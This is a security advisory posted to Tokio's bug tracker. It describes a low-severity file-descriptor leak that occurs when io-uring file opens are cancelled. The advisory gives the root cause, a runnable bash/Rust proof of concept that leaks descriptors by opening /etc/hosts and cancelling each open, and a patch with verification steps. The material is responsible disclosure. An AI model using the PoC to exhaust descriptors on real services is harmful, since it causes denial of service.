We received the below report from Mufeed VH of Winfunc Research. Thank you @mufeedvh for reporting this! I've determined that this bug does not need to be handled under embargo, so I am posting it publicly on our bug tracker.

---

## Summary
An attacker who can trigger and cancel Tokio `io-uring` file opens in a Linux deployment can leak process file descriptors, leading to file-descriptor exhaustion and denial of service.

## Severity
LOW

CVSS v3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L` (3.7)

## Root Cause
Tokio's Linux `io-uring` filesystem path creates an `OpenAt` operation that only adopts the returned file descriptor if `Open::complete` runs. When the future is dropped after first poll, Tokio switches the operation lifecycle to `Cancelled`, but later completion handling discards the CQE result instead of adopting or closing a successful fd.

Relevant code:

- [`tokio/src/fs/open_options.rs#L520-L541`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/fs/open_options.rs#L520-L541)
- [`tokio/src/io/uring/open.rs#L20-L25`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/io/uring/open.rs#L20-L25)
- [`tokio/src/runtime/driver/op.rs#L77-L91`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/driver/op.rs#L77-L91)
- [`tokio/src/runtime/io/driver/uring.rs#L75-L84`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L75-L84)
- [`tokio/src/runtime/io/driver/uring.rs#L259-L279`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L259-L279)

## Proof of Exploitability
1. `OpenOptions::open()` enters the Linux `io-uring` branch and submits `Op::open(path, opts)?.await` when `io-uring` is enabled and supported: [`tokio/src/fs/open_options.rs#L520-L541`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/fs/open_options.rs#L520-L541).
2. `Open::complete()` is the only place that turns a successful CQE result into an owned `File` via `File::from_raw_fd(fd as i32)`: [`tokio/src/io/uring/open.rs#L20-L25`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/io/uring/open.rs#L20-L25).
3. Dropping a polled `Op<Open>` calls `cancel_op(index, data)`, which stores `Lifecycle::Cancelled(cancel_data)` but does not submit a kernel cancel or install any fd cleanup: [`tokio/src/runtime/driver/op.rs#L77-L91`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/driver/op.rs#L77-L91), [`tokio/src/runtime/io/driver/uring.rs#L259-L279`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L259-L279).
4. When the kernel later completes the open, `dispatch_completions()` sees `Lifecycle::Cancelled(_)` and removes the slab entry, explicitly discarding the CQE result: [`tokio/src/runtime/io/driver/uring.rs#L75-L84`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L75-L84).
5. The attached runnable PoC executes that path 128 times in a Linux container and shows `/proc/self/fd` growing from `7` to `136`, proving leaked file descriptors in the same process.

## Preconditions
- Linux deployment where `io_uring` syscalls are permitted.
- Tokio built with `--cfg tokio_unstable` and the `fs`, `rt`, and `io-uring` features enabled.
- Application code uses Tokio's `OpenOptions::open()` on attacker-triggerable paths and can drop the future or owning task after the first poll.
- The runtime takes the `io-uring` path rather than falling back to the blocking-thread implementation.

## Runnable PoC
```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="$(pwd)"
TMPDIR="$(mktemp -d)"
trap 'rm -rf "$TMPDIR"' EXIT

mkdir -p "$TMPDIR/src"

cat > "$TMPDIR/Cargo.toml" <<TOML
[package]
name = "io_uring_fd_leak_poc"
version = "0.1.0"
edition = "2021"

[workspace]

[dependencies]
tokio = { path = "$REPO_ROOT/tokio", features = ["fs", "rt", "rt-multi-thread", "time", "io-uring", "sync"] }
TOML

cat > "$TMPDIR/src/main.rs" <<'RS'
use std::fs;
use std::future::{poll_fn, Future};
use std::path::PathBuf;
use std::task::Poll;
use std::time::Duration;

fn fd_count() -> usize {
    fs::read_dir("/proc/self/fd").unwrap().count()
}

async fn cancel_open(path: PathBuf) {
    let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();

    let handle = tokio::spawn(async move {
        poll_fn(|cx| {
            let mut opt = tokio::fs::OpenOptions::new();
            opt.read(true);
            let fut = opt.open(&path);
            let mut fut = Box::pin(fut);
            let poll = fut.as_mut().poll(cx);
            assert!(matches!(poll, Poll::Pending), "open did not use io_uring path");
            tx.send(()).unwrap();
            Poll::<()>::Pending
        })
        .await;
    });

    rx.recv().await.unwrap();
    handle.abort();
    let err = handle.await.unwrap_err();
    assert!(err.is_cancelled(), "task did not cancel as expected");
}

fn main() {
    let rt = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(1)
        .enable_all()
        .build()
        .unwrap();

    rt.block_on(async {
        let path = PathBuf::from("/etc/hosts");
        let before = fd_count();

        for _ in 0..128 {
            cancel_open(path.clone()).await;
        }

        tokio::time::sleep(Duration::from_millis(250)).await;

        let after = fd_count();
        let leaked = after.saturating_sub(before);

        println!("before={before}");
        println!("after={after}");
        println!("leaked={leaked}");

        assert!(leaked >= 64, "expected many leaked fds, saw {leaked}");
    });
}
RS

docker run --rm \
  --security-opt seccomp=unconfined \
  -e RUSTFLAGS="--cfg tokio_unstable" \
  -v "$REPO_ROOT":"$REPO_ROOT" \
  -v "$TMPDIR":"$TMPDIR" \
  -w "$TMPDIR" \
  rust:1.85-bookworm \
  cargo run --quiet
```

## Expected Result
The script should complete successfully and print output similar to:

```text
before=7
after=136
leaked=129
```

`leaked` should be a large positive number. In the verified run for this audit, the fd count increased by `129`.

## Impact
This is an availability issue. Each successful canceled `OpenAt` leaks one live `O_CLOEXEC` descriptor inside the Tokio process. Repeated attacker-triggerable cancellations can exhaust `RLIMIT_NOFILE`, after which the process will fail additional file opens and may also fail unrelated socket or pipe creation.

The proven impact is bounded to descriptor exhaustion. I did not observe confidentiality or integrity impact from the leaked descriptors.

## Remediation
Ensure canceled `OpenAt` completions are explicitly cleaned up instead of discarded.

Before:

```rust
Some(Lifecycle::Cancelled(_)) => {
    ops.remove(idx);
}
```

After:

```rust
Some(Lifecycle::Cancelled(cancel_data)) => {
    if let CancelData::Open(_) = cancel_data {
        let result = CqeResult::from(cqe).result;
        if let Ok(fd) = result {
            unsafe { libc::close(fd as i32) };
        }
    }
    ops.remove(idx);
}
```

The underlying principle is ownership preservation on canceled operations: if completion of a canceled request can create a resource, Tokio must either adopt that resource into an RAII owner or close it immediately.

## Verification After Fix
1. Re-run the PoC above in the same Linux containerized environment.
2. Confirm the program no longer reports a large positive `leaked` count.
3. A correct fix should keep `after` close to `before` and must not satisfy the PoC's current `assert!(leaked >= 64)`.
4. Add a regression test alongside [`tokio/tests/fs_uring.rs#L113-L145`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/tests/fs_uring.rs#L113-L145) that cancels many polled opens and asserts descriptor count stability.
